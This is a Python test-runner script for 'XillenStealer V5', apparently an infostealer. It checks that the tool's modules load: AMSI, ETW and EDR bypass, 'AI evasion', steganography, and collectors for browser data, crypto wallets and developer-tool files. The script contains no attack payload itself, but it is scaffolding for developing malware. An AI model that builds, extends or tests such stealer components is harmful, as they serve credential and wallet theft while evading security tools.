import sys
import os
import logging
from datetime import datetime

sys.path.insert(0, os.path.dirname(__file__))

class SafeTestRunner:
    def __init__(self):
        self.logger = self.setup_logging()
        self.test_results = {}
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('v5_test.log'),
                logging.StreamHandler()
            ]
        )
        return logging.getLogger(__name__)
    
    def test_imports(self):
        self.logger.info("Testing module imports...")
        
        modules_to_test = [
            ('core.utils.logger', 'Logger'),
            ('core.evasion.advanced_amsi', 'AdvancedAMSIBypass'),
            ('core.evasion.advanced_etw', 'AdvancedETWBypass'),
            ('core.evasion.edr_bypass', 'EDRBypass'),
            ('core.collectors.extended_browsers', 'ExtendedBrowserCollector'),
            ('core.collectors.crypto_wallets', 'CryptoWalletCollector'),
            ('core.collectors.dev_tools', 'DevToolsCollector'),
            ('core.collectors.steganography', 'SteganographyModule'),
            ('core.ai_evasion', 'AIEvasionEngine')
        ]
        
        import_results = {}
        
        for module_name, class_name in modules_to_test:
            try:
                module = __import__(module_name, fromlist=[class_name])
                cls = getattr(module, class_name)
                import_results[module_name] = "SUCCESS"
                self.logger.info(f"✓ {module_name}.{class_name}")
            except Exception as e:
                import_results[module_name] = f"FAILED: {e}"
                self.logger.error(f"✗ {module_name}.{class_name}: {e}")
        
        self.test_results['imports'] = import_results
        return import_results
    
    def test_rust_engine(self):
        self.logger.info("Testing Rust engine availability...")
        
        try:
            from core.rust_engine.py_integration import RustEngine
            engine = RustEngine()
            
            if engine.is_available():
                self.logger.info("✓ Rust engine available")
                
                test_data = "test_string_123"
                encrypted = engine.encrypt_data(test_data)
                hash_result = engine.hash_blake3(test_data)
                
                self.test_results['rust_engine'] = {
                    'available': True,
                    'encryption_test': len(encrypted) > 0,
                    'hashing_test': len(hash_result) > 0
                }
                
                self.logger.info("✓ Rust engine functionality tested")
            else:
                self.logger.info("! Rust engine not available - using fallbacks")
                self.test_results['rust_engine'] = {
                    'available': False,
                    'fallback_mode': True
                }
        
        except Exception as e:
            self.logger.error(f"✗ Rust engine test failed: {e}")
            self.test_results['rust_engine'] = {'available': False, 'error': str(e)}
    
    def test_evasion_modules(self):
        self.logger.info("Testing evasion modules (safe mode)...")
        
        evasion_results = {}
        
        try:
            from core.evasion.advanced_amsi import AdvancedAMSIBypass
            amsi = AdvancedAMSIBypass()
            evasion_results['amsi'] = "Module loaded"
            self.logger.info("✓ AMSI bypass module loaded")
        except Exception as e:
            evasion_results['amsi'] = f"Failed: {e}"
            self.logger.error(f"✗ AMSI module: {e}")
        
        try:
            from core.evasion.advanced_etw import AdvancedETWBypass
            etw = AdvancedETWBypass()
            evasion_results['etw'] = "Module loaded"
            self.logger.info("✓ ETW bypass module loaded")
        except Exception as e:
            evasion_results['etw'] = f"Failed: {e}"
            self.logger.error(f"✗ ETW module: {e}")
        
        try:
            from core.evasion.edr_bypass import EDRBypass
            edr = EDRBypass()
            evasion_results['edr'] = "Module loaded"
            self.logger.info("✓ EDR bypass module loaded")
        except Exception as e:
            evasion_results['edr'] = f"Failed: {e}"
            self.logger.error(f"✗ EDR module: {e}")
        
        self.test_results['evasion'] = evasion_results
    
    def test_collectors(self):
        self.logger.info("Testing collector modules (safe mode)...")
        
        collector_results = {}
        
        try:
            from core.collectors.extended_browsers import ExtendedBrowserCollector
            browser_collector = ExtendedBrowserCollector()
            collector_results['browsers'] = f"Supports {len(browser_collector.browsers)} browser categories"
            self.logger.info("✓ Browser collector loaded")
        except Exception as e:
            collector_results['browsers'] = f"Failed: {e}"
            self.logger.error(f"✗ Browser collector: {e}")
        
        try:
            from core.collectors.crypto_wallets import CryptoWalletCollector
            wallet_collector = CryptoWalletCollector()
            collector_results['wallets'] = f"Supports {len(wallet_collector.wallet_paths)} wallet categories"
            self.logger.info("✓ Wallet collector loaded")
        except Exception as e:
            collector_results['wallets'] = f"Failed: {e}"
            self.logger.error(f"✗ Wallet collector: {e}")
        
        try:
            from core.collectors.dev_tools import DevToolsCollector
            dev_collector = DevToolsCollector()
            collector_results['dev_tools'] = f"Supports {len(dev_collector.ide_paths)} IDE types"
            self.logger.info("✓ Dev tools collector loaded")
        except Exception as e:
            collector_results['dev_tools'] = f"Failed: {e}"
            self.logger.error(f"✗ Dev tools collector: {e}")
        
        self.test_results['collectors'] = collector_results
    
    def test_ai_evasion(self):
        self.logger.info("Testing AI evasion module (safe mode)...")
        
        try:
            from core.ai_evasion import AIEvasionEngine
            ai_evasion = AIEvasionEngine()
            
            self.test_results['ai_evasion'] = "Module loaded successfully"
            self.logger.info("✓ AI evasion module loaded")
        except Exception as e:
            self.test_results['ai_evasion'] = f"Failed: {e}"
            self.logger.error(f"✗ AI evasion: {e}")
    
    def test_steganography(self):
        self.logger.info("Testing steganography module (safe mode)...")
        
        try:
            from core.collectors.steganography import SteganographyModule
            stego = SteganographyModule()
            
            self.test_results['steganography'] = "Module loaded successfully"
            self.logger.info("✓ Steganography module loaded")
        except Exception as e:
            self.test_results['steganography'] = f"Failed: {e}"
            self.logger.error(f"✗ Steganography: {e}")
    
    def run_safe_tests(self):
        self.logger.info("=== XillenStealer V5 Safe Testing ===")
        self.logger.info("Running safe tests without any system modifications...")
        
        self.test_imports()
        self.test_rust_engine()
        self.test_evasion_modules()
        self.test_collectors()
        self.test_ai_evasion()
        self.test_steganography()
        
        self.generate_report()
    
    def generate_report(self):
        self.logger.info("=== Test Results Summary ===")
        
        total_tests = 0
        passed_tests = 0
        
        for category, results in self.test_results.items():
            self.logger.info(f"\n{category.upper()}:")
            
            if isinstance(results, dict):
                for test_name, result in results.items():
                    total_tests += 1
                    if "SUCCESS" in result or "loaded" in result or "Supports" in result:
                        passed_tests += 1
                        status = "✓"
                    else:
                        status = "✗"
                    self.logger.info(f"  {status} {test_name}: {result}")
            else:
                total_tests += 1
                if "SUCCESS" in results or "loaded" in results:
                    passed_tests += 1
                    status = "✓"
                else:
                    status = "✗"
                self.logger.info(f"  {status} {category}: {results}")
        
        success_rate = (passed_tests / total_tests) * 100 if total_tests > 0 else 0
        
        self.logger.info(f"\n=== FINAL RESULTS ===")
        self.logger.info(f"Tests passed: {passed_tests}/{total_tests}")
        self.logger.info(f"Success rate: {success_rate:.1f}%")
        
        if success_rate >= 80:
            self.logger.info("🎉 XillenStealer V5 modules are working correctly!")
        elif success_rate >= 60:
            self.logger.info("⚠️ XillenStealer V5 mostly working, some issues found")
        else:
            self.logger.info("❌ XillenStealer V5 has significant issues")
        
        return success_rate

def main():
    print("XillenStealer V5 Safe Test Runner")
    print("This will only test module loading - no system modifications")
    
    tester = SafeTestRunner()
    success_rate = tester.run_safe_tests()
    
    print(f"\nTest completed with {success_rate:.1f}% success rate")
    print("Check 'v5_test.log' for detailed results")

if __name__ == "__main__":
    main()
